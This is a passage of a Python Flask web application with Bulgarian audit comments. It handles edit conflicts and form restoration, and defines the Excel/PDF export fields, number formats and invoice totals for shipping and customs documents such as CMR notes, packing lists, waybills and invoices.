            # само по-грубата разлика, хваната преди началото на функцията.
            cur = con.execute(
                "UPDATE documents SET data = ?, number = ?, version = version + 1"
                " WHERE id = ? AND version = ?",
                (json.dumps(new_data, ensure_ascii=False), number, doc_id, current_version))
            if cur.rowcount == 0:
                con.rollback()
                flash(_conflict_msg, "error")
                # Одит (03.09.2026, находка №15): виж горния клон — тясната
                # междина между проверката и самия UPDATE също запазва
                # въведеното. Текущата версия се чете наново, защото
                # чуждият запис вече я е вдигнал.
                fresh = con.execute("SELECT version FROM documents WHERE id = ?",
                                    (doc_id,)).fetchone()
                token = _store_preview(
                    "doc", (doc_type, new_data, doc_id,
                            fresh["version"] if fresh else current_version))
                return redirect("%s?restore=%s"
                                % (url_for("edit_document", doc_id=doc_id), token))
            con.commit()
        except sqlite3.IntegrityError:
            # Одит (16.08.2026, находка №14): огледално на _document_new по-
            # горе — при РЪЧЕН номер (фактурите) редакция, сменяща номера на
            # стойност, заета точно междувременно от друг документ, гърмеше
            # тук с необяснен 500 вместо ясна грешка (виж db._m004/_m005 за
            # уникалния индекс). con.rollback() е нужен, за да не остане
            # отворена транзакция.
            con.rollback()
            # Одит (31.08.2026, находка №4): и тук въведеното се ЗАПАЗВА —
            # редакцията на вече издаден документ е също толкова скъпа за
            # преписване наново, колкото първоначалното въвеждане.
            flash(_("Номер %s вече е зает от друг документ от същата година. "
                    "Въведеното е запазено — променете номера и опитайте пак.")
                  % number, "error")
            token = _store_preview("doc", (doc_type, new_data, doc_id, current_version))
            return redirect("%s?restore=%s" % (request.path, token))
        flash(_("Документ № %s е обновен.") % number, "success")
        return redirect(url_for("view_document", doc_id=doc_id))

    # Одит (19.08.2026, находка №25) — виж _document_new по-долу.
    clients = load_clients(con, CLIENT_EMBED_LIMIT)
    clients_total = count_clients(con)
    settings = db.get_settings(con)
    # Възстановяване след „Предварителен преглед" → „Назад към формата" по
    # време на РЕДАКЦИЯ на вече издаден документ (заявка: „при връщане
    # назад от преглед за печат въведената информация се губи") — огледално
    # на СЪЩИЯ механизъм в _document_new по-горе (?restore=<token>), само
    # че тук edit_doc/номерът/баркодът остават от реалния запис в базата
    # (row) — заменя се САМО съдържанието (data), с which формата се
    # предзарежда, за да не изгубим коя точно редакция продължаваме.
    restore_token = request.args.get("restore")
    restored_version = None
    if restore_token:
        payload = _get_preview(restore_token, "doc")
        if payload is not None and payload[0] == doc_type:
            data = payload[1]
            # Одит (19.08.2026, находка №10): версията от МОМЕНТА, в който
            # операторът е започнал редакцията — не пресният ред от базата.
            # len() проверката приема и стари 3-елементни токени, издадени
            # преди обновяването и още живи в паметта.
            if len(payload) > 3:
                restored_version = payload[3]
        else:
            # Одит (16.08.2026, находка №31): токенът за preview изтича
            # (виж _get_preview/PREVIEW_TTL) — до тази поправка при изтекъл/
            # невалиден токен формата тихо зареждаше СТАРИТЕ стойности от
            # базата (row/data по-горе), сякаш нищо не се е случило, и
            # операторът не разбираше, че въведеното в „Предварителен
            # преглед" НЕ е възстановено.
            flash(_("Данните от предварителния преглед вече не са налични (изтекъл "
                    "линк) — показани са последно запазените стойности на документа."),
                  "warning")
    ctx = {
        "clients": clients,
        "clients_json": clients_json(clients, con) if doc_type == "cmr" else clients_json(clients),
        "clients_total": clients_total,
        "s": settings,
        "edit_doc": row,
        "edit_data": data,
        # Одит (19.08.2026, находка №10): шаблоните рендират точно това (а
        # не edit_doc.version), за да оцелее версията през „Преглед → Назад“.
        "edit_doc_version": (restored_version if restored_version is not None
                             else (row["version"] if "version" in row.keys() else 1)),
    }
    if DOCUMENT_FLOWS[doc_type]["needs_items"]:
        ctx["items"] = data.get("items", [])
    if DOCUMENT_FLOWS[doc_type]["invoice_clients"]:
        # Одит (05.09.2026, находка №12): вграждат се първите EMBED_LIMIT
        # записа (при типична инсталация — всичките), а останалите се
        # намират през /invoices/clients/lookup.
        ctx["invoice_clients"] = invoice_clients_module.load_all(
            con, limit=invoice_clients_module.EMBED_LIMIT)
        ctx["invoice_clients_total"] = invoice_clients_module.count_all(con)
        ctx["invoice_clients_json"] = invoice_clients_module.as_json(con)
    return render_template(FORM_TEMPLATES[doc_type], **ctx)


# ---------------------------------------------------------------- износ в Excel (.xlsx)
# Данните на всеки документ (номер, страни, стоки и т.н.) + редовете
# артикули (ако има) — в удобен за отваряне в Excel файл. PDF не се
# генерира отделно — печатните шаблони вече поддържат "Save as PDF" през
# диалога за печат на браузъра (вграден във Windows/Chromium, работи offline,
# без нужда от допълнителни компоненти в самата програма).

#: Заглавните полета на фактурите — общи за двата типа (виж коментара при
#: използването им в _XLSX_FIELDS по-долу).
_INVOICE_FIELDS = [
    ("Дата", "doc_date"), ("Държава на произход", "country_origin"),
    ("Вид транспорт", "transport_way"), ("Условия на плащане", "terms_payment"),
    ("Условия на доставка", "terms_delivery"), ("Валута", "currency"),
    ("Акредитив №", "lc_number"), ("Потвърждение №", "confirmation_number"),
    ("Банкови данни", "bank_details"),
    ("Изпращач", "sender_name"), ("Адрес изпращач", "sender_address"),
    ("ДДС № изпращач", "sender_vat"), ("Телефон изпращач", "sender_phone"),
    ("Получател", "consignee_name"), ("Адрес получател", "consignee_address"),
    ("Телефон получател", "consignee_phone"),
    ("Фактура до", "billto_name"), ("Адрес за фактуриране", "billto_address"),
    ("Телефон за фактуриране", "billto_phone"),
    ("Описание на стоката", "description"), ("Забележки", "notes"),
]

_XLSX_FIELDS = {
    "cmr": [
        ("Дата на съставяне", "established_date"), ("Място на съставяне", "established_place"),
        ("Изпращач", "sender_name"), ("Адрес изпращач", "sender_address"),
        ("Град изпращач", "sender_city"), ("Държава изпращач", "sender_country"),
        # Одит (находка С10): ЕИК/ДДС номерата ги има във формата и на
        # печатната бланка, но липсваха тук — за митнически документ като
        # ЧМР идентификацията по ДДС номер не е козметична подробност.
        ("ЕИК/ДДС изпращач", "sender_eik"),
        ("Получател", "consignee_name"), ("Адрес получател", "consignee_address"),
        ("Град получател", "consignee_city"), ("Държава получател", "consignee_country"),
        ("ДДС/ЕИК получател", "consignee_vat"),
        ("Разтоварен пункт", "place_delivery"), ("Товарен пункт", "place_loading"),
        ("Дата на натоварване", "date_loading"), ("Приложени документи", "attached_docs"),
        ("Марки и номера", "marks"), ("Брой колети", "packages"), ("Вид на опаковката", "packing"),
        ("Вид на стоката", "goods"), ("Статистически №", "stat_no"),
        ("Бруто тегло, кг", "weight"), ("Обем, м³", "volume"),
        ("Указания на изпращача", "sender_instructions"), ("Плащане на превоза", "payment_instructions"),
        ("Наложен платеж", "cod"), ("Специални споразумения", "special_agreements"),
        ("Превозвач", "carrier"), ("Последващи превозвачи", "successive_carriers"),
        ("Рег. № влекач", "truck_reg"), ("Рег. № ремарке", "trailer_reg"), ("Шофьор", "driver"),
        ("Резерви на превозвача", "reservations"),
    ],
    "packing": [
        ("Дата", "doc_date"), ("Изпращач", "sender_name"), ("Адрес изпращач", "sender_address"),
        ("Лице за контакт (изпращач)", "sender_contact"), ("Телефон изпращач", "sender_phone"),
        ("Имейл изпращач", "sender_email"),
        ("Получател", "receiver_name"), ("Адрес получател", "receiver_address"),
        ("Град получател", "receiver_city"), ("Държава получател", "receiver_country"),
        ("Лице за контакт (получател)", "receiver_contact"), ("Телефон получател", "receiver_phone"),
        ("Имейл получател", "receiver_email"),
        ("Фактура №", "invoice_no"), ("Поръчка №", "order_no"),
        ("Условия на доставка", "terms_delivery"), ("Вид транспорт", "transport_type"),
        ("HS Code", "hs_code"),
        ("Общо колети", "total_packages"), ("Общо обем, м³", "total_volume"),
        ("Общо нето, кг", "total_net"), ("Общо бруто, кг", "total_gross"),
        ("Забележки", "notes"),
    ],
    "pallet": [
        ("Дата", "doc_date"), ("Палет №", "pallet_no"), ("Тип палет", "pallet_type"),
        ("Изпращач", "sender_name"), ("Клиент", "client_name"), ("Адрес клиент", "client_address"),
        ("Град клиент", "client_city"), ("Държава клиент", "client_country"),
        ("Вид опаковка", "packaging_type"), ("Общ брой", "__total_qty__"),
        ("Бруто, кг", "gross"), ("Височина, см", "height"),
        ("Свързано ЧМР №", "ref_cmr"), ("Забележки", "notes"),
    ],
    "waybill": [
        ("Издадена в", "established_place"), ("Издадена на", "established_date"),
        ("Изпращач", "sender_name"), ("Адрес изпращач", "sender_address"),
        ("Превозвач", "carrier_name"), ("Адрес превозвач", "carrier_address"),
        ("Получател", "consignee_name"), ("Адрес получател", "consignee_address"),
        ("Град получател", "consignee_city"), ("Държава получател", "consignee_country"),
        ("Място на натоварване", "place_loading"), ("Дата на натоварване", "date_loading"),
        ("Място на разтоварване", "place_delivery"), ("Дата на разтоварване", "date_delivery"),
        ("Пробег, км", "mileage"),
        ("Опасен товар — клас", "dangerous_class"), ("Опасен товар — наименование", "dangerous_name"),
        ("Придружител на товара", "escort_name"), ("Брой придружители", "escort_count"),
        ("Превозна цена, EUR", "transport_price"), ("Допълнителни разходи, EUR", "extra_costs"),
        ("Марка на автомобила", "vehicle_make"), ("Модел на автомобила", "vehicle_model"),
        ("Рег. № на автомобила", "vehicle_reg"), ("Пътен лист №", "route_sheet_no"),
        ("Инструкции на превозвача", "carrier_instructions"),
        ("Натоварване — дата", "loading_date"), ("Натоварване — от час", "loading_from"),
        ("Натоварване — до час", "loading_to"),
        ("Разтоварване — дата", "unloading_date"), ("Разтоварване — от час", "unloading_from"),
        ("Разтоварване — до час", "unloading_to"),
        ("Забележка", "notes"),
    ],
    "dualuse": [
        ("Дата", "doc_date"), ("Износител", "sender_name"), ("ЕИК/ЕГН", "sender_eik"),
        ("Фактура/и №", "invoice_numbers"), ("Дата на фактурата", "invoice_date"),
        ("Държава на износ", "destination_country"), ("Място на съставяне", "place"),
        # Одит (01.09.2026, девети одит, находка №7): `place_country` излизаше
        # САМО на бланката (dualuse_print.html: „{{ d.place }}{% if
        # d.place_country %}, {{ d.place_country }}{% endif %}“) — и
        # CHANGELOG-ът, и тестът от онази поправка покриват само печата.
        # Стойността се записва от формата (appcore.form_data), но никога не
        # стигаше до износа: бланката казваше „Габрово, България“, а Excel и
        # PDF — само „Габрово“. Класическата „непокрита половина“.
        ("Държава на съставяне", "place_country"),
        ("Декларатор", "declarant_name"), ("Длъжност", "declarant_position"),
    ],
    "export_it": [
        ("Дата", "doc_date"), ("Декларатор", "declarant_name"),
        ("Пълномощник на", "represented_company"), ("Фактура №", "invoice_no"),
        ("Износител", "exporter_company"), ("Получател", "receiver_name"),
        ("Ref. ЧМР №", "ref_cmr"), ("Място на съставяне", "place"),
    ],
    # Двете фактури имат ЕДНАКВИ заглавни полета (различават се само по
    # колоните на стоките, виж _XLSX_ITEM_COLUMNS) — с едно изключение:
    # „Потвърждение №“ (Confirmation Number) го има само норвежкият
    # образец. Оставено е и в двата списъка нарочно: при Бразилия полето
    # просто е празно, вместо да се поддържат два почти еднакви списъка,
    # които лесно се разминават при следваща промяна.
    "invoice_br": _INVOICE_FIELDS,
    "invoice_no": _INVOICE_FIELDS,
    "invoice_dubai": _INVOICE_FIELDS,
}

_XLSX_ITEM_COLUMNS = {
    # Ред на колоните по образеца PL.xlsx: Вид опаковка първа, после
    # Описание на материала (виж packing_form.html/packing_print.html).
    "packing": [("packing", "Вид опаковка"), ("description", "Описание на материала"),
               ("qty", "Брой"),
               ("length", "Дължина, мм"), ("width", "Широчина, мм"), ("height", "Височина, мм"),
               ("volume", "Обем, м³"), ("net", "Нето, кг"), ("gross", "Бруто, кг")],
    "pallet_generic": [("code", "Артикул/код"), ("description", "Описание"),
                       ("qty", "Количество"), ("weight", "Тегло, кг")],
    "pallet_orders": [("order_no", "Поръчка №"), ("pos", "Позиция"), ("reference", "Референция"),
                      ("reference_desc", "Описание"), ("qty", "Количество")],
    "waybill": [("description", "Наименование"), ("packing", "Опаковка"), ("marks", "Маркировка/номера"),
               ("weight", "Тегло, кг"), ("qty", "Брой")],
    # Колоните на всяка фактура са ТОЧНО тези от съответния образец и в
    # неговия ред (виж invoice_br_print.html / invoice_no_print.html) —
    # Бразилия с нето тегло и без описание, Норвегия с описание и палет №,
    # без тегло. „Обща цена“/„Общо тегло“ са изчислени колони (виж
    # _INVOICE_COMPUTED_COLUMNS в _export_fields_and_items).
    "invoice_br": [("hs_code", "HS code"), ("po_no", "P.O NO"), ("pos", "Pos"),
                   ("net_weight", "Нето тегло, кг/бр"), ("material_code", "Код на материала"),
                   ("qty", "Количество"), ("unit_price", "Единична цена, EUR"),
                   ("__row_total__", "Обща цена, EUR"), ("__row_weight__", "Общо тегло, кг")],
    "invoice_no": [("hs_code", "HS code"), ("description", "Описание на материала"),
                   ("pallet_no", "Палет №"), ("po_no", "P.O NO"), ("pos", "Pos"),
                   ("material_code", "Код на материала"), ("qty", "Количество"),
                   ("unit_price", "Единична цена, EUR"),
                   ("__row_total__", "Обща цена, EUR")],
    # Дубай (образец 12971.pdf): нито нето тегло, нито описание — само
    # HS code, P.O NO, Pos, Material code, Quantity, Unit Price.
    "invoice_dubai": [("hs_code", "HS code"), ("po_no", "P.O NO"), ("pos", "Pos"),
                      ("material_code", "Код на материала"), ("qty", "Количество"),
                      ("unit_price", "Единична цена, EUR"),
                      ("__row_total__", "Обща цена, EUR")],
}

# Одит (16.08.2026, находка №19, средна): всички стойности в data/items се
# пазят като ТЕКСТ (формите ги подават суров request.form) — преди тази
# поправка export_document_xlsx ги записваше В КЛЕТКАТА КАТО ТЕКСТ дори за
# колони, които сa по същество числа (количество/тегло/цена), затова Excel
# ги показваше подравнени вляво (текстов формат), не участваха в SUM()
# формула без ръчно "Convert to Number" от получателя, и не се сортираха
# числово. Списъкът тук изброява ключовете на колоните от _XLSX_ITEM_COLUMNS
# по-горе, за които export_document_xlsx (по-долу) записва РЕАЛНО число
# (float) с number_format, вместо суровия текст — вижте и цитата в
# КОЛОНИ по-горе за кои полета НЕ са тук нарочно (hs_code/po_no/pos/
# material_code/reference/code — кодове, не количества, ПАЗЯТ водещи нули
# и не бива да минават през числово форматиране).
_NUMERIC_ITEM_COLUMN_KEYS = {
    "qty", "weight", "net", "gross", "length", "width", "height", "volume",
    "net_weight", "unit_price", "__row_total__", "__row_weight__",
}

#: Одит (19.08.2026, находка №31): ЗАГЛАВНИТЕ (обобщаващи) полета на
#: документа, които са числа и трябва да се запишат в Excel като истински
#: числа, не като текст. Поправката на находка №19 (16.08) покри само
#: РЕДОВЕТЕ артикули — заглавните полета останаха низове, при това точно
#: онези, които получателят най-често сумира („Общо нето, кг“, „Общо бруто,
#: кг“, „Общо обем, м³“, „Общо колети“). Проверено: в един и същ файл
#: клетките на редовете бяха числа (0.0625), а „Общо нето, кг“ — текстът
#: „1.11“ (подравнен вляво, невъзможен за SUM/сортиране).
#:
#: Паричните полета (_MONEY_FIELDS) и датите (_DATE_FIELDS) СЪЗНАТЕЛНО не
#: са тук — те вече минават през форматиране („123.45 €“, „07.08.2026“) и
#: са текст по предназначение.
_NUMERIC_FIELD_KEYS = {
    "total_net", "total_gross", "total_volume", "total_packages",
    "gross", "height", "length", "width", "net", "volume", "weight",
    "__total_qty__",
}


#: Полета, показвани с "€" суфикс в износите (Excel/PDF) — заявка: "да
#: остане валута само евро". Само товарителницата за вътрешен превоз има
#: парични полета в момента (transport_price/extra_costs) — вижте
#: appcore.format_eur_amount за самото форматиране (споделено и с
#: waybill_print.html чрез Jinja global format_eur).
_MONEY_FIELDS = {"waybill": {"transport_price", "extra_costs"}}

#: Одит (31.08.2026, находка №10): ключовете на редовите колони, които са
#: ПАРИ, а не количества — общата маска за количества („0.###“) режеше
#: единичната цена 0.0125 до „0.013“, а обикновена цена „1.20“ показваше
#: като „1.2“.
#:
#: Одит (01.09.2026, девети одит, находка №9): маската вече НЕ е една и съща
#: за двете. „0.00“ реши горния проблем, но създаде огледален: единичната
#: цена е СВОБОДЕН текст (въвежда се ръчно или идва от Excel импорт), тоест
#: може законно да има повече от два знака — 0.0125 се показваше „0.01“,
#: докато бланката и PDF-ът (fmt_num, пази въведената точност) казват
#: 0.0125. Получателят пресмята 1000 × 0.01 = 10.00, а редът TOTAL твърди
#: 12.50 — точно противоречието, срещу което е писана самата находка №10.
#: „0.00###“ показва НАЙ-МАЛКО два знака (счетоводният вид на цена) и до
#: пет, ако въведеното наистина ги има. Общата сума на реда (`__row_total__`)
#: остава с точно два — тя минава през `_fmt_money`, който сам квантува до
#: два, значи повече знаци там са невъзможни по конструкция.
_MONEY_ITEM_COLUMN_FORMATS = {"unit_price": "0.00###", "__row_total__": "0.00"}

#: Одит (03.09.2026, находка №5): маската за КОЛИЧЕСТВА/ТЕГЛА/ОБЕМИ. Беше
#: „0.###“ — три знака — и режеше точно това, което поправките от 31.08 и
#: 01.09 оправиха при парите: тегло 0.0875 се ПОКАЗВАШЕ като „0.088“, а
#: 0.087135 като „0.087“, докато бланката и PDF-ът (fmt_num пази въведената
#: точност) казват пълната стойност. Не е хипотетично: справочникът
#: материали записва теглата с „%.6f“ (materials._weight_cell), тоест 4–6
#: знака са норма, а самите те влизат във фактурата през търсенето по код.
#: Получателят на Excel файла смята 100 × 0.088 = 8.8 кг, а колоната „Общо
#: тегло“ и хартията казват 8.75. Шест знака покриват реалната точност на
#: източника; излишните нули пак се крият (5 остава „5“, не „5.000000“).
_QUANTITY_NUMBER_FORMAT = "0.######"


def _pdf_normalized_numbers(fields, items, cols, totals_row, doc_type):
    """Одит (31.08.2026, находка №8): копие на `fields`/`items`/`totals_row`,
    в което ЧИСЛОВИТЕ стойности минават през `fmt_num` (запетая→точка).

    Работи върху КОПИЯ — самите данни на документа не се пипат. Паричните
    полета (вече форматирани с „€“ от `_export_fields_and_items`) и датите
    се пропускат: те са текст по предназначение, а `fmt_num` така или иначе
    би върнал неразчетимата стойност непроменена."""
    money_keys = _MONEY_FIELDS.get(doc_type, ())
    date_keys = _DATE_FIELDS.get(doc_type, ())
    field_keys = [key for _label, key in _XLSX_FIELDS.get(doc_type, [])]

    out_fields = []
    for (label, value), key in zip(fields, field_keys):
        if key in _NUMERIC_FIELD_KEYS and key not in money_keys and key not in date_keys:
            value = fmt_num(value)
        out_fields.append((label, value))

    numeric_col_keys = {key for key, _label in cols
                        if key in _NUMERIC_ITEM_COLUMN_KEYS}
    out_items = []
    for it in items:
        row = dict(it) if isinstance(it, dict) else {}
        for key in numeric_col_keys:
            if key in row:
                row[key] = fmt_num(row[key])
        out_items.append(row)

    out_totals = totals_row
    if totals_row is not None:
        # Одит (01.09.2026, доуточнение на находка №8, установено при
        # преглед на v3.69.0): редът на проверката е обърнат — `and` НЕ
        # пренарежда операндите, значи `cols[i][0]` се оценяваше ПРЕДИ
        # `i < len(cols)`. В момента е безобидно, защото
        # `_invoice_export_totals_row` винаги строи `totals_row` с точно
        # `len(cols)` елемента, но кодът е писан отбранително, сякаш това
        # НЕ е гарантирано — при по-дълъг `totals_row` в бъдеще би гърмяло с
        # `IndexError` точно вътре в защитата, вместо да прескочи елемента.
        out_totals = [
            fmt_num(v) if (i < len(cols) and cols[i][0] in numeric_col_keys) else v
            for i, v in enumerate(totals_row)
        ]
    return out_fields, out_items, out_totals

#: Одит (25.08.2026, находка №11): заглавни полета със стойност по
#: подразбиране при ПРАЗНА стойност — за да не се разминават износът и
#: бланката. Печатната бланка на фактурата показва „Currency: <b>{{ d.currency
#: or 'EURO' }}</b>“, а Excel/PDF износът пишеше суровото data.get('currency')
#: — за фактура без изрична валута (изчистено поле или стара фактура отпреди
#: полето) бланката казваше „EURO“, а таблицата в Excel — празно. Всички
#: суми са фиксирано в евро („Единична цена, EUR“, format_eur), затова
#: подразбиращата се валута е EURO навсякъде, единно.
_FIELD_EXPORT_DEFAULTS = {"currency": "EURO"}

#: Полета с ISO дата (или дата-час), които при износ (Excel/PDF) трябва да
#: минат през appcore.format_bg_date, за да излязат във вида „ДД.ММ.ГГГГ“ —
#: заявка: „в цялата програма промени изгледа на дата да е ден.месец.година“,
#: избран обхват включва изрично и Excel/PDF износа. Ключовете идват от
#: <input type="date"> полета в самите форми (ISO стойност) — doc_date не е
#: сред тях, понеже там е свободен текст в повечето шаблони, но е добавен,
#: защото формите го попълват през <input type="date"> навсякъде другаде.
_DATE_FIELDS = {
    "cmr": {"established_date", "date_loading"},
    "packing": {"doc_date"},
    "pallet": {"doc_date"},
    "waybill": {"established_date", "date_loading", "date_delivery",
                "loading_date", "unloading_date"},
    "dualuse": {"doc_date", "invoice_date"},
    "export_it": {"doc_date"},
    "invoice_br": {"doc_date"},
    "invoice_no": {"doc_date"},
    "invoice_dubai": {"doc_date"},
}

#: Изчислените колони на редовете във фактурите — не се пазят в data (за
#: да не могат да се разминат с количеството/цената при по-късна
#: редакция), а се смятат на момента от СЪЩИТЕ функции, които ползват и
#: печатните бланки (appcore.invoice_row_total/invoice_row_weight), за да
#: няма разлика между бланката и Excel/PDF износа.
_INVOICE_COMPUTED_COLUMNS = {
    "__row_total__": invoice_row_total,
    "__row_weight__": invoice_row_weight,
}


def _export_filename(con, doc_type, row, data, ext):
    """Име на PDF/Excel файла при износ — заявка: „наименованието на файла
    палетната карта, която се запаметява като pdf или xlsx да е псевдонима
    на клиента [и] номер палетна карта, на английски език“. Само за
    палетни карти (единствения тип, за който бе поискано) и само когато
    клиентът има зададен псевдоним в адресната книга (client_export.
    resolve_client_alias) — иначе пада обратно към досегашния модел
    „<тип>_<номер>.<разширение>“, който важи за всички останали типове
    документи непроменено."""
    # В18: sanitize_number_stub заменя ВСИЧКИ Windows-забранени знаци
    # (не само „/“) — вижте client_export.sanitize_number_stub за
    # пълното обяснение (риск: ръчно въведен номер на фактура).
    number_stub = client_export.sanitize_number_stub(row["number"])
    if doc_type == "pallet":
        alias = client_export.resolve_client_alias(con, data)
        if alias:
            stub = client_export.sanitize_filename_stub(alias)
            if stub:
                return "%s_%s.%s" % (stub, number_stub, ext)
    return "%s_%s.%s" % (doc_type, number_stub, ext)


def _export_fields_and_items(doc_type, data):
    """Общата логика за "какво да покаже износът" (полета + редове+колони),
    споделена от Excel (export_document_xlsx) и PDF (export_document_pdf)
    износа — вижте pdf_export.py защо PDF-ът нарочно преизползва точно тези
    речници вместо отделен pixel-perfect PDF шаблон."""
    money_keys = _MONEY_FIELDS.get(doc_type, ())
    date_keys = _DATE_FIELDS.get(doc_type, ())
    fields = []
    for label, key in _XLSX_FIELDS.get(doc_type, []):
        # "__total_qty__" е специален случай (само за pallet) — „Общ брой“
        # НЕ се пази като суров запис в data, изчислява се на момента от
        # items (виж appcore.pallet_total_qty), точно както във формата и
        # печатните шаблони.
        value = pallet_total_qty(data.get("items")) if key == "__total_qty__" else data.get(key, "")
        # Одит (25.08.2026, находка №11): празно поле → подразбираща се
        # стойност (напр. валута „EURO“), за да съвпада с печатната бланка.
        if not str(value or "").strip() and key in _FIELD_EXPORT_DEFAULTS:
            value = _FIELD_EXPORT_DEFAULTS[key]
        if key in money_keys and value:
            value = format_eur_amount(value)
        elif key in date_keys and value:
            value = format_bg_date(value)
        fields.append((label, value))

    # Одит (29.08.2026, находка №3): втора защита за ВЕЧЕ ЗАПИСАНИ документи с
    # развален ред (записани преди филтъра в appcore.parse_items, или от
    # ръчна намеса в базата). Без нея износът на такъв документ падаше с
    # `AttributeError: 'str' object has no attribute 'get'` — Excel с необработен
    # 500, PDF с „PDF генерирането е неуспешно“ — и оставаше НЕВЪЗМОЖЕН
    # завинаги. Тази функция е общата точка на ДВАТА износа (виж
    # export_document_xlsx/export_document_pdf), затова филтърът тук покрива и
    # двата. Останалият код (сумите, шаблоните) вече пази isinstance(it, dict).
    items = [it for it in (data.get("items") or []) if isinstance(it, dict)]
    cols = []
    if items:
        if doc_type == "pallet":
            cols = _XLSX_ITEM_COLUMNS["pallet_orders" if data.get("items_format") == "orders"
                                      else "pallet_generic"]
        else:
            cols = _XLSX_ITEM_COLUMNS.get(doc_type, [])

    # Изчислените колони на фактурите ("Обща цена"/"Общо тегло") не
    # съществуват в записаните редове — допълваме ги тук, в КОПИЕ на всеки
    # ред, за да не променяме самите данни на документа.
    computed_keys = [key for key, _label in cols if key in _INVOICE_COMPUTED_COLUMNS]
    if computed_keys:
        enriched = []
        for it in items:
            row = dict(it) if isinstance(it, dict) else {}
            for key in computed_keys:
                row[key] = _INVOICE_COMPUTED_COLUMNS[key](it)
            enriched.append(row)
        items = enriched

    return fields, items, cols


def _invoice_export_totals_row(doc_type, items, cols):
    """Одит (находка С2, среден риск): Excel/PDF износът на фактура
    показваше редовете артикули, но НЕ и обобщаващия ред TOTAL — за
    разлика от печатната бланка (invoice_dubai_print.html/
    invoice_br_print.html/invoice_no_print.html), която винаги го показва
    (виж appcore.invoice_totals). За търговска фактура, изпращана към
    счетоводство/митница, износ без общата сума е съществена липса —
    получателят трябва сам да сумира ръчно колоната.

    Връща списък стойности, подравнени 1:1 по `cols` (същия ред колони
    като редовете артикули, за да легне направо като поредния ред в
    таблицата), или None ако документният тип не е фактура, или няма
    редове/колони изобщо (нищо за сумиране — печатните бланки също не
    показват TOTAL ред без нито един артикул)."""
    if doc_type not in db.INVOICE_DOC_TYPES or not items or not cols:
        return None
    keys = [key for key, _label in cols]
    if "qty" not in keys and "__row_total__" not in keys:
        return None
    totals = invoice_totals(items)
    row = ["" for _ in cols]
    row[0] = "TOTAL"
    if "qty" in keys:
        row[keys.index("qty")] = totals["qty"]
    if "__row_total__" in keys:
        # Символ за евро на общата сума — СЪЩОТО поведение като на
        # печатната бланка (виж invoice_br_print.html/
        # invoice_dubai_print.html: "{{ (t.price ~ ' €') if t.price else '—' }}").
        row[keys.index("__row_total__")] = ("%s €" % totals["price"]) if totals["price"] else ""
    # Одит (19.08.2026, находка №32): и общото ТЕГЛО. Колоната „Общо тегло,
    # кг“ вече се пълни по редовете, `invoice_totals` вече го е сметнало,
    # но клетката в реда TOTAL оставаше празна — получателят (счетоводство/
    # митница) трябваше да сумира на ръка точно колоната, заради която
    # редът TOTAL изобщо беше добавен (находка С2).
    if "__row_weight__" in keys:
        row[keys.index("__row_weight__")] = totals["weight"]
    return row


def _append_xlsx_item_row(ws, values, cols):
    """Одит (16.08.2026, находка №19): добавя РЕД от items/totals_row към
    работния лист — за колони от _NUMERIC_ITEM_COLUMN_KEYS ЗАПИСВА РЕАЛНО
    ЧИСЛО (float) с number_format вместо суровия текст, ако стойността
    изобщо се разпознава като число (appcore._parse_decimal — същата
    строга валидация като навсякъде другаде в проекта). Неразпознаваема/
    празна/с добавен суфикс (напр. „123.45 €“ в обобщаващия TOTAL ред)
    стойност пада обратно към стария текстов запис — без загуба, само без
    числово форматиране за тази конкретна клетка."""
    row_values = list(values)
    numeric_cols = []
    for c, (key, _label) in enumerate(cols, start=1):
        if key not in _NUMERIC_ITEM_COLUMN_KEYS:
            continue
        idx = c - 1
        if idx >= len(row_values):
            continue
        num = _parse_decimal(row_values[idx])
        # Одит (25.08.2026, находка №12): отрицателна стойност НЕ се записва
        # като истинско число. Всички суми в проекта (invoice_totals,
        # pallet_total_qty, packing_sum) третират отрицателния ред като
        # невалиден и го ИЗКЛЮЧВАТ (находка С1), но тук `_parse_decimal` го
        # пускаше — значи отрицателното количество влизаше ЧИСЛОВО в колоната.
        # Получателят, който направи =SUM() по нея, получаваше различна сума
        # от отпечатания TOTAL: количества 10 и −3 → печатният TOTAL е 10, а
        # Excel SUM дава 7. Сега стойността остава ВИДИМА като текст (както на
        # самата бланка, където редът се показва суров с предупреждение), но
        # извън всяка числова сума — точно както в печатния документ.
        if num is not None and num >= 0:
            row_values[idx] = num
            numeric_cols.append((c, key))
    _xlsx_append(ws, row_values)
    for c, key in numeric_cols:
        # Одит (31.08.2026, находка №10): ПАРИТЕ получават собствен формат.
        #
        # Досега всички числови колони — включително единичната цена и
        # общата цена на реда — ползваха маската за КОЛИЧЕСТВА „0.###“.
        # Проверено с изпълнение: фактура с qty=1000 и unit_price=0.0125
        # даваше клетки 1000 / 0.0125 / 12.5, но Excel ги ПОКАЗВАШЕ като
        # 1000 / 0.013 / 12.5 — получателят пресмята 1000 × 0.013 = 13.00 и
        # фактурата си противоречи сама, докато бланката показва 0.0125 и
        # 12.50. Обикновена цена „1.20“ пък излизаше като „1.2“.
        #
        # Одит (01.09.2026, находка №9): маската за пари вече е ПО КЛЮЧ (виж
        # _MONEY_ITEM_COLUMN_FORMATS) — твърдото „0.00“ за ВСИЧКИ парични
        # колони отряза единичната цена 0.0125 до „0.01“ и възпроизведе
        # същото противоречие с бланката, само в обратната посока.
        money_format = _MONEY_ITEM_COLUMN_FORMATS.get(key)
        if money_format:
            ws.cell(row=ws.max_row, column=c).number_format = money_format
        else:
            # Количества/тегла/обеми: маската маха излишните нули след
            # десетичната запетая (5 си остава „5“), но пази реалната
            # точност на въведеното — виж _QUANTITY_NUMBER_FORMAT.
            ws.cell(row=ws.max_row, column=c).number_format = _QUANTITY_NUMBER_FORMAT


#: Одит (19.08.2026, информативна находка): твърдият таван на .xlsx за
#: дължина на текстова клетка (32 767 знака) и видимият маркер, който
#: слагаме на мястото на отрязаното — виж _xlsx_safe_value.
_XLSX_MAX_CELL_LEN = 32767
_XLSX_TRUNCATED_MARK = " […ТЕКСТЪТ Е ОТРЯЗАН ПРИ ИЗНОСА — над 32767 знака]"


def _xlsx_safe_value(value):
    """Одит (находка В2, висок риск): openpyxl хвърля некоригируем
    ``IllegalCharacterError`` при опит да запише низ, съдържащ т.нар.
    "control characters" (напр. вертикален таб \\x0b — точно това вмъква
    Word при "Shift+Enter"/"мек нов ред", ако потребител копира текст
    оттам в свободно текстово поле като бележки/адрес). Грешката гърми
    ПРИ САМОТО ЗАПИСВАНЕ (buf.getvalue()/wb.save по-долу), т.е. целият
    износ пада с 500 — практически неоткриваем за потребителя проблем,
    защото самите полета изглеждат съвсем нормално в интерфейса.

    Тук изчистваме забранените контролни символи (същият регулярен израз,
